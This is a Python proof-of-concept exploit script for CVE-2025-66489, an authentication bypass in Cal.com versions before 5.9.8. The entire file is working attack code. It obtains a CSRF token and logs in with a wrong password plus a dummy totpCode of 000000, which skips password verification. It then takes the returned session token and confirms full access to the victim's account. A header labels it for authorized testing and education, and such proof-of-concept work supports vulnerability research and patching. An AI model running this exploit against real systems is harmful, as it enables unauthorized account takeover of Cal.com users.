#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Cal.com Authentication Bypass via TOTP Code Injection
# CVE            : CVE-2025-66489
# Vendor         : Cal.com
# Product        : Cal.com
# Affected       : < 5.9.8
# Type           : CWE-303 - Incorrect Implementation of Authentication Algorithm
# CVSS           : 9.8 (Critical)
# Platform       : Any (Web Application)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Cal.com Authentication Bypass via TOTP Code Injection

Demonstrates how an attacker can bypass password verification in Cal.com < 5.9.8
by supplying any truthy value in the `totpCode` field during login. This exploits
a logic flaw in the NextAuth credentials provider where password verification is
conditionally gated on `!credentials.totpCode`.

ATTACK CHAIN:
  1. Obtain CSRF token from /api/auth/csrf
  2. POST to /api/auth/callback/credentials with totpCode=000000
  3. Password verification is skipped — session token returned
  4. Full account access without knowing the password

PREREQUISITES:
  - Target Cal.com instance < 5.9.8
  - Valid email address of a user without 2FA enabled

REFERENCES:
  - CVE-2025-66489
"""

import sys
import json
import http.client
import http.cookiejar
import urllib.parse
import urllib.request

# ANSI color codes for terminal output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

DEFAULT_HOST = "172.19.0.4"
DEFAULT_PORT = 3000
DEFAULT_EMAIL = "victim@example.com"


def banner():
    print(f"""{CYAN}{BOLD}
╔══════════════════════════════════════════════════════════╗
║  CVE-2025-66489 — Cal.com Auth Bypass via TOTP Injection ║
║  Cal.com < 5.9.8 | CVSS 9.8 Critical                    ║
╚══════════════════════════════════════════════════════════╝{RESET}
""")


def get_csrf_token(base_url):
    """
    Step 1: Obtain a valid CSRF token from the NextAuth CSRF endpoint.
    This is an unauthenticated request — no credentials needed.
    """
    print(f"{YELLOW}[*] Step 1: Fetching CSRF token from {base_url}/api/auth/csrf{RESET}")
    try:
        req = urllib.request.Request(f"{base_url}/api/auth/csrf")
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
            csrf_token = data.get("csrfToken")
            # Also capture the cookie from the CSRF response (needed for session binding)
            cookies = resp.headers.get_all("Set-Cookie") or []
            print(f"{GREEN}[+] CSRF token obtained: {csrf_token[:20]}...{RESET}")
            return csrf_token, cookies
    except Exception as e:
        print(f"{RED}[!] Failed to get CSRF token: {e}{RESET}")
        sys.exit(1)


def attempt_login(base_url, email, password, csrf_token, csrf_cookies, totp_code=None):
    """
    Step 2/3: Attempt login via the NextAuth credentials callback.

    When totp_code is provided (any truthy value), the vulnerable code path at
    line 179 of next-auth-options.ts skips password verification entirely:

        if (user.password?.hash && !credentials.totpCode) {
            // Password check ONLY happens here — SKIPPED when totpCode is truthy
        }

    For non-2FA users, the subsequent 2FA check is also skipped (twoFactorEnabled=false),
    resulting in full authentication bypass.
    """
    label = "BYPASS (with totpCode)" if totp_code else "NORMAL (without totpCode)"
    print(f"\n{YELLOW}[*] Step {'3' if totp_code else '2'}: Attempting login — {label}{RESET}")
    print(f"    Email:    {email}")
    print(f"    Password: {password}")
    if totp_code:
        print(f"    totpCode: {totp_code} (triggers password bypass)")

    # Build form data
    form_data = {
        "email": email,
        "password": password,
        "csrfToken": csrf_token,
        "callbackUrl": f"{base_url}/",
        "json": "true",
    }
    if totp_code is not None:
        form_data["totpCode"] = totp_code

    encoded = urllib.parse.urlencode(form_data).encode("utf-8")

    # Build request with CSRF cookies
    req = urllib.request.Request(
        f"{base_url}/api/auth/callback/credentials",
        data=encoded,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    # Add CSRF cookies from the token request
    for cookie in csrf_cookies:
        # Extract just the cookie name=value part
        cookie_val = cookie.split(";")[0]
        if req.has_header("Cookie"):
            req.add_unredirected_header("Cookie", req.get_header("Cookie") + "; " + cookie_val)
        else:
            req.add_header("Cookie", cookie_val)

    # Use a custom opener that doesn't follow redirects, so we can inspect the response
    class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None  # Don't follow redirects

    opener = urllib.request.build_opener(NoRedirectHandler)

    try:
        response = opener.open(req, timeout=30)
        status = response.status
        headers = response.headers
        body = response.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        status = e.code
        headers = e.headers
        body = e.read().decode(errors="replace")

    # Analyze the response
    location = headers.get("Location", "")
    set_cookies = headers.get_all("Set-Cookie") or []
    session_cookie = None
    for sc in set_cookies:
        if "next-auth.session-token" in sc:
            session_cookie = sc.split(";")[0]
            break

    print(f"    HTTP Status:  {status}")
    print(f"    Location:     {location}")
    if session_cookie:
        token_val = session_cookie.split("=", 1)[1] if "=" in session_cookie else session_cookie
        print(f"    Session Token: {token_val[:40]}...")
    else:
        print(f"    Session Token: (none)")

    # Determine if login succeeded
    # Success: redirect to "/" or "/getting-started" with a session cookie
    # Failure: redirect to "/auth/error" or "/api/auth/error" or contains "error"
    success = session_cookie is not None and "error" not in location.lower()

    return success, session_cookie, status, location


def verify_session(base_url, session_cookie):
    """
    Step 4: Verify the obtained session is valid by hitting the session endpoint.
    This confirms full account takeover — the session returns user details.
    """
    print(f"\n{YELLOW}[*] Step 4: Verifying session validity{RESET}")

    req = urllib.request.Request(f"{base_url}/api/auth/session")
    req.add_header("Cookie", session_cookie)

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
            if data and data.get("user"):
                user = data["user"]
                print(f"{GREEN}[+] Session is VALID — authenticated as:{RESET}")
                print(f"    Name:  {user.get('name', 'N/A')}")
                print(f"    Email: {user.get('email', 'N/A')}")
                print(f"    ID:    {user.get('id', 'N/A')}")
                print(f"    Role:  {user.get('role', 'N/A')}")
                return True, data
            else:
                print(f"{RED}[-] Session returned empty data: {data}{RESET}")
                return False, data
    except Exception as e:
        print(f"{RED}[!] Session verification failed: {e}{RESET}")
        return False, None


def exploit(target_host, target_port, victim_email):
    """
    Main exploit flow:
    1. Fetch CSRF token (unauthenticated)
    2. Attempt normal login with WRONG password (should fail — baseline)
    3. Attempt login with WRONG password + totpCode=000000 (should succeed — bypass)
    4. Verify the obtained session grants access to victim's account
    """
    base_url = f"http://{target_host}:{target_port}"
    wrong_password = "ThisIsDefinitelyNotThePassword123!"

    banner()
    print(f"{BOLD}Target: {base_url}{RESET}")
    print(f"{BOLD}Victim: {victim_email}{RESET}")

    # Step 1: Get CSRF token
    csrf_token, csrf_cookies = get_csrf_token(base_url)

    # Step 2: Baseline — normal login with wrong password (should FAIL)
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}  BASELINE TEST: Wrong password WITHOUT totpCode{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")
    normal_success, _, normal_status, normal_location = attempt_login(
        base_url, victim_email, wrong_password, csrf_token, csrf_cookies, totp_code=None
    )
    if normal_success:
        print(f"\n{RED}[!] WARNING: Normal login with wrong password succeeded!")
        print(f"    This is unexpected — the baseline should fail.{RESET}")
    else:
        print(f"\n{GREEN}[+] Baseline confirmed: wrong password correctly rejected{RESET}")

    # Step 3: Exploit — login with wrong password + totpCode bypass
    # Need fresh CSRF token for new request
    csrf_token2, csrf_cookies2 = get_csrf_token(base_url)

    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{RED}{BOLD}  EXPLOIT: Wrong password WITH totpCode=000000{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")
    bypass_success, session_cookie, bypass_status, bypass_location = attempt_login(
        base_url, victim_email, wrong_password, csrf_token2, csrf_cookies2, totp_code="000000"
    )

    if not bypass_success:
        print(f"\n{RED}[!] EXPLOIT FAILED: The bypass did not work.{RESET}")
        print(f"    The target may be patched (>= v5.9.8) or the user may not exist.")
        return False

    print(f"\n{GREEN}{BOLD}[+] EXPLOIT SUCCEEDED: Password verification was BYPASSED!{RESET}")

    # Step 4: Verify session
    session_valid, session_data = verify_session(base_url, session_cookie)

    # Final summary
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}  RESULTS SUMMARY{RESET}")
    print(f"{BOLD}{'='*60}{RESET}")
    print(f"  Normal login (wrong password, no totpCode): {'FAILED (correct)' if not normal_success else 'SUCCEEDED (unexpected)'}")
    print(f"  Bypass login (wrong password + totpCode):   {'SUCCEEDED ✓' if bypass_success else 'FAILED ✗'}")
    print(f"  Session valid:                              {'YES ✓' if session_valid else 'NO ✗'}")

    if bypass_success and session_valid:
        print(f"\n{GREEN}{BOLD}  ✅ CVE-2025-66489 CONFIRMED — Authentication bypass demonstrated{RESET}")
        print(f"  The attacker gained access to {victim_email}'s account")
        print(f"  without knowing the correct password.")
        return True
    elif bypass_success:
        print(f"\n{YELLOW}{BOLD}  ⚠  CVE-2025-66489 PARTIALLY CONFIRMED — Bypass succeeded but session unverified{RESET}")
        return True
    else:
        print(f"\n{RED}{BOLD}  ❌ CVE-2025-66489 NOT CONFIRMED{RESET}")
        return False


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    email = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_EMAIL

    success = exploit(target, port, email)
    sys.exit(0 if success else 1)
